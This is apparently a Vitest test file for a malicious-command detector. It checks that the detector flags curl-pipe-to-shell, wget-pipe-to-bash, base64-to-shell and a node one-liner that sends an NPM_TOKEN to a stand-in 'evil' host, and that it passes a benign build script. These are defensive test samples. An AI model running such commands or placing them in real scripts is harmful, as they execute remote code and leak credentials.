import { describe, it, expect } from "vitest";
import { matchMaliciousPatterns } from "./malicious-patterns.js";

describe("matchMaliciousPatterns", () => {
  it("flags curl|sh exfil pattern", () => {
    const matches = matchMaliciousPatterns("curl https://evil.example/x.sh | sh");
    expect(matches.map((m) => m.id)).toContain("CURL_SH");
  });

  it("flags wget|bash exfil pattern", () => {
    const matches = matchMaliciousPatterns("wget -qO- http://evil/x | bash");
    expect(matches.map((m) => m.id)).toContain("WGET_BASH");
  });

  it("flags env-var + network-exec combination", () => {
    const matches = matchMaliciousPatterns(
      "node -e \"require('https').get('http://evil/?t='+process.env.NPM_TOKEN)\"",
    );
    expect(matches.map((m) => m.id)).toContain("ENV_EXFIL_NODE_E");
  });

  it("flags base64-decoded inline eval", () => {
    const matches = matchMaliciousPatterns(
      "echo 'Y3Vy...' | base64 -d | sh",
    );
    expect(matches.map((m) => m.id)).toContain("BASE64_PIPE_SH");
  });

  it("returns empty for a benign build script", () => {
    expect(matchMaliciousPatterns("tsc && cp README.md dist/")).toEqual([]);
  });
});
